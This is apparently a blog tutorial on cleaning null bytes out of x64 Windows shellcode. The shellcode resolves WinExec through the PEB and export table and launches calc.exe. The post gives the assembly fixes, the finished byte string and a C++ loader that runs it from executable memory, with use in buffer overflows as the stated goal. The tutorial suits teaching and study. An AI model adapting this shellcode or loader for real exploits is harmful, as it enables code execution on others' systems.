---
title:  "x64 Assembly and Shellcoding 101 - Part 3"
header:
  teaser: "/assets/images/shellcode_vs.png"
categories:
  - Shellcoding
  - Assembly
  - Debugging
tags:
  - Shellcoding
  - x64
  - x64dbg
  - '2024'
  - nasm
  - assembly
  - debugging
---

Now is the time for the expected continuation of part 1 of this blog series, where we clean up our code and remove those NULLs.  In this way, we'll be able to reliably use our shellcode in buffer overflows, etc.  Let's do it!

***x64 Assembly & Removing Null bytes***
-

We will start with the offending code that contains null bytes.  I'm going to **start from the bottom and work my way to the top** of our code used in part 1 of this series.  It may be worthwhile to have a separate tab open in your browser if you need to reference it at any point.  

```nasm
00000000000000a5 <executeit>:
  a5:   41 5f                   pop    %r15
  a7:   b8 00 00 00 00          mov    $0x0,%eax
  ac:   50                      push   %rax
  ad:   48 b8 63 61 6c 63 2e    movabs $0x6578652e636c6163,%rax
  b4:   65 78 65
  b7:   50                      push   %rax
  b8:   48 89 e1                mov    %rsp,%rcx
  bb:   ba 01 00 00 00          mov    $0x1,%edx
  c0:   48 83 ec 30             sub    $0x30,%rsp
  c4:   41 ff d7                call   *%r15
```
**first offender, this line:**
```nasm
b8 00 00 00 00          mov    $0x0,%eax
```
Isn't it crazy that by moving the NULL byte to terminate our string using the mov instruction, you introduce that many zeros into your code?!  😿
There's no need to fret though, as we can fix this one easily!  We will replace that **MOV** instruction with **XOR** instead:

```nasm
xor rax, rax
push rax
```
**now run objdump and review the results.  No zeros!!!:**
```nasm
48 31 c0                xor    %rax,%rax
50                      push   %rax
```

**okay, on to the next offending culprit, this line:**
```nasm
ba 01 00 00 00          mov    $0x1,%edx
```
**I'm sure you already figured it out 😸  All we need to do is once more replace mov with xor:**
```nasm
xor rdx, rdx
inc rdx
```
**Now let's review objdump's output.  Once again, no zeros!**
```nasm
48 31 d2                xor    %rdx,%rdx
48 ff c2                inc    %rdx
```
**Here's the next two.  These are from `OrdinalLookup` and `OrdinalLookupSetup`.  Just delete these lines entirely.  These jumps aren't needed and were mainly used to help debug the code when I first wrote it.  There, that was easy huh?**
```nasm
78 00                   js     7b <OrdinalLookup>
78 00                   js     a5 <executeit>
```
**Alright, we're almost done!  We're in our `main` function at the top of the code now.  You can just delete this line:**
```nasm
eb 00                   jmp    59 <kernel32findfunction>
```
**These next two were the hardest for me to work out.  We need to retain the string terminator but we also don't want to have to deal with NULLs.**
```nasm
48 b8 57 69 6e 45 78    movabs $0x636578456e6957,%rax
65 63 00
```
We'll use a nice little Bitwise shiftleft and shiftright trick to 'operationally' add a zero after we've already committed our string to memory.  Here's what it looks like.  We'll use a **nop** as a placeholder for where the 00 would normally go:
```nasm
mov rax, 0x90636578456E6957           ;WinExec
shl rax, 0x8                          ;636578456E695700 <--notice how the 90 turns into a 00
shr rax, 0x8                          ;00636578456E6957 <-- now the nop has been replaced by a 0 but this null will NOT be present in our machine code / shellcode!
```
**And now let's review objdump's output.  Look ma, no NULLs!!!**
```nasm
48 c1 e0 08             shl    $0x8,%rax
48 c1 e8 08             shr    $0x8,%rax
50                      push   %rax
```
When we push rax, we'll be greeted by our familiar WinExec string and satisfy keeping a **null** without it being present in our shellcode:

![image](https://github.com/user-attachments/assets/160a2500-158a-4bc1-9c8a-b0776fa10864)

**Now, drum roll please.... 🥁  The final NULL!!**
```nasm
 8b 93 88 00 00 00       mov    0x88(%rbx),%edx
 ```
**Basically, we just need to move `[rbx+0x88]` hex value into `rdx`.  However, we can't exactly do it the way you would expect.  The 'simple' way generates nulls.  Here's what we'll need to do instead:**
```nasm
xor rcx, rcx                  ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff                ; add to lower portion of register
shr rcx, 0x8                  ; shift right, which will remove the FF placeholder and leave the value we want: RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]            ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
```
**That's it!  All nulls have been removed!!  We can now get our newly fashioned shellcode (without nulls) and use in a buffer overflow, free of any worries regarding nulls.  Here's what the objdump output looks like for me:**

```nasm
winexec_nonulls.obj:     file format pe-x86-64

Disassembly of section .text:

0000000000000000 <main>:
   0:   48 83 ec 28             sub    $0x28,%rsp
   4:   48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
   8:   48 31 c9                xor    %rcx,%rcx
   b:   65 48 8b 41 60          mov    %gs:0x60(%rcx),%rax
  10:   48 8b 40 18             mov    0x18(%rax),%rax
  14:   48 8b 70 10             mov    0x10(%rax),%rsi
  18:   48 8b 36                mov    (%rsi),%rsi
  1b:   48 8b 36                mov    (%rsi),%rsi
  1e:   48 8b 5e 30             mov    0x30(%rsi),%rbx
  22:   49 89 d8                mov    %rbx,%r8
  25:   8b 5b 3c                mov    0x3c(%rbx),%ebx
  28:   4c 01 c3                add    %r8,%rbx
  2b:   48 31 c9                xor    %rcx,%rcx
  2e:   66 81 c1 ff 88          add    $0x88ff,%cx
  33:   48 c1 e9 08             shr    $0x8,%rcx
  37:   8b 14 0b                mov    (%rbx,%rcx,1),%edx
  3a:   4c 01 c2                add    %r8,%rdx
  3d:   44 8b 52 14             mov    0x14(%rdx),%r10d
  41:   4d 31 db                xor    %r11,%r11
  44:   44 8b 5a 20             mov    0x20(%rdx),%r11d
  48:   4d 01 c3                add    %r8,%r11
  4b:   4c 89 d1                mov    %r10,%rcx
  4e:   48 b8 57 69 6e 45 78    movabs $0x90636578456e6957,%rax
  55:   65 63 90
  58:   48 c1 e0 08             shl    $0x8,%rax
  5c:   48 c1 e8 08             shr    $0x8,%rax
  60:   50                      push   %rax
  61:   48 89 e0                mov    %rsp,%rax
  64:   48 83 c4 08             add    $0x8,%rsp

0000000000000068 <kernel32findfunction>:
  68:   67 e3 17                jecxz  82 <FunctionNameNotFound>
  6b:   31 db                   xor    %ebx,%ebx
  6d:   41 8b 5c 8b 04          mov    0x4(%r11,%rcx,4),%ebx
  72:   4c 01 c3                add    %r8,%rbx
  75:   48 ff c9                dec    %rcx
  78:   4c 8b 08                mov    (%rax),%r9
  7b:   4c 39 0b                cmp    %r9,(%rbx)
  7e:   74 03                   je     83 <FunctionNameFound>
  80:   75 e6                   jne    68 <kernel32findfunction>

0000000000000082 <FunctionNameNotFound>:
  82:   cc                      int3

0000000000000083 <FunctionNameFound>:
  83:   51                      push   %rcx
  84:   41 5f                   pop    %r15
  86:   4c 89 f9                mov    %r15,%rcx
  89:   4d 31 db                xor    %r11,%r11
  8c:   44 8b 5a 24             mov    0x24(%rdx),%r11d
  90:   4d 01 c3                add    %r8,%r11
  93:   48 ff c1                inc    %rcx
  96:   66 45 8b 2c 4b          mov    (%r11,%rcx,2),%r13w
  9b:   4d 31 db                xor    %r11,%r11
  9e:   44 8b 5a 1c             mov    0x1c(%rdx),%r11d
  a2:   4d 01 c3                add    %r8,%r11
  a5:   43 8b 44 ab 04          mov    0x4(%r11,%r13,4),%eax
  aa:   4c 01 c0                add    %r8,%rax
  ad:   50                      push   %rax
  ae:   41 5f                   pop    %r15
  b0:   48 31 c0                xor    %rax,%rax
  b3:   50                      push   %rax
  b4:   48 b8 63 61 6c 63 2e    movabs $0x6578652e636c6163,%rax
  bb:   65 78 65
  be:   50                      push   %rax
  bf:   48 89 e1                mov    %rsp,%rcx
  c2:   48 31 d2                xor    %rdx,%rdx
  c5:   48 ff c2                inc    %rdx
  c8:   48 83 ec 30             sub    $0x30,%rsp
  cc:   41 ff d7                call   *%r15
```
**Let's convert to shellcode now.  I'll use Linux this time around and use the following commands:**

- nasm -fwin64 winexec_nonulls.asm -o winexec_nonulls.o

- for i in $(objdump -D winexec_nonulls.o \| grep "^ " \| cut -f2); do echo -n "\x$i" ; done

**here's what I got:**
```nasm
"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b"
"\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89"
"\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9"
"\x08\x8b\x14\x0b\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20"
"\x4d\x01\xc3\x4c\x89\xd1\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x90\x48\xc1"
"\xe0\x08\x48\xc1\xe8\x08\x50\x48\x89\xe0\x48\x83\xc4\x08\x67\xe3\x17\x31"
"\xdb\x41\x8b\x5c\x8b\x04\x4c\x01\xc3\x48\xff\xc9\x4c\x8b\x08\x4c\x39\x0b"
"\x74\x03\x75\xe6\xcc\x51\x41\x5f\x4c\x89\xf9\x4d\x31\xdb\x44\x8b\x5a\x24"
"\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d\x31\xdb\x44\x8b\x5a\x1c"
"\x4d\x01\xc3\x43\x8b\x44\xab\x04\x4c\x01\xc0\x50\x41\x5f\x48\x31\xc0\x50"
"\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\x31\xd2\x48"
"\xff\xc2\x48\x83\xec\x30\x41\xff\xd7";
```
**Let's try using it in some actual code to make sure it works as intended 😸**

(I don't have a buffer overflow exploit I can use this on at the moment, otherwise we could give that a go lol)

```c++
#include <windows.h>
#include <iostream>

// Shellcode (as given, formatted for clarity)
unsigned char shellcode[] =
"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b"
"\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89"
"\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9"
"\x08\x8b\x14\x0b\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20"
"\x4d\x01\xc3\x4c\x89\xd1\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x90\x48\xc1"
"\xe0\x08\x48\xc1\xe8\x08\x50\x48\x89\xe0\x48\x83\xc4\x08\x67\xe3\x17\x31"
"\xdb\x41\x8b\x5c\x8b\x04\x4c\x01\xc3\x48\xff\xc9\x4c\x8b\x08\x4c\x39\x0b"
"\x74\x03\x75\xe6\xcc\x51\x41\x5f\x4c\x89\xf9\x4d\x31\xdb\x44\x8b\x5a\x24"
"\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d\x31\xdb\x44\x8b\x5a\x1c"
"\x4d\x01\xc3\x43\x8b\x44\xab\x04\x4c\x01\xc0\x50\x41\x5f\x48\x31\xc0\x50"
"\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\x31\xd2\x48"
"\xff\xc2\x48\x83\xec\x30\x41\xff\xd7";

int main() {
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (exec_mem == nullptr) {
        std::cerr << "Memory allocation failed\n";
        return -1;
    }

    memcpy(exec_mem, shellcode, sizeof(shellcode));
    auto shellcode_func = reinterpret_cast<void(*)()>(exec_mem);
    shellcode_func();
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
```

![image](https://github.com/user-attachments/assets/d3a85a38-48b6-4133-ad2e-8087075bc821)

## Bonus Content for subscribers (WinExec + ExitThread)

<iframe 
    src="https://docs.google.com/document/d/1BKfL3_OBJRi4mI60ZUM-wWmv7WGbqc16y7Mm39_hcCs/edit?usp=sharing" 
    width="100%" 
    height="600" 
    style="border:1px solid #ccc;" 
    frameborder="0">
</iframe>

There you have it!  NULL free shellcode for the win 😄  I've had fun with this series so far, and there's more exciting stuff on the way.  I still need to do the dynamic messagebox at some point as promised.  All in due time.  See you guys next time!


